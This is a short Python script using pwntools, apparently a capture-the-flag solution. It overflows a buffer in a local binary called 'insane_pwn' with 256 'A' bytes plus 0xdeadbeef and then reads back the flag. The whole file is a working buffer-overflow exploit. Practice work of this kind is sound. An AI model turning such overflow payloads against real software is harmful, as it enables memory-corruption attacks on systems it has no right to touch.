from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./insane_pwn"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break fgets
        continue
    ''')
else:
    p = process(binfile)

payload = b""
payload += b"A" * 256
payload += p32(0xdeadbeef)

p.recvuntil("Can you lead me to segmentation fault please?\n")
p.sendline(payload)
p.recvuntil("Thank you! you can have your flag: ")
print(p.recvline())

#p.interactive()
